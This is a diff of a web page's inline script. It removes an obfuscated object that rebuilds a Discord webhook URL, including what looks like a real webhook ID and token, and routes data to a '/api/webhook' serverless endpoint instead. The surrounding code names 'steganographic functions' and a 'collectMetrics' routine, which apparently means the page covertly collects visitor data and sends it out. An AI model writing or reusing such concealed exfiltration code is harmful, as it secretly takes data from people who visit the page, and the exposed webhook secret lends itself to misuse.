@@ -32,23 +32,8 @@
   <h1>soosy</h1>
 
   <script>
-    // Obfuscated configuration
-    const _ = {
-      a: 'https://',
-      b: 'discord',
-      c: '.com/',
-      d: 'api/',
-      e: 'web',
-      f: 'hooks/',
-      g: '1379912944636137474/',
-      h: 'vdH51dL76q-pm2reNLkxo0kJJS-0Yu5cP5aKFdTI9j-H1YVRAOkApNkqTEzGwpTSBRjS'
-    };
-
-    // Dynamic assembly with noise
-    const noise1 = Math.random();
-    const noise2 = Date.now();
-    const assembleEndpoint = () => _['a'] + _['b'] + _['c'] + _['d'] + _['e'] + _['f'] + _['g'] + _['h'];
-    const endpoint = assembleEndpoint();
+    // Use your Vercel function endpoint
+    const endpoint = '/api/webhook';
 
     // Steganographic functions
     const collectMetrics = async () => {
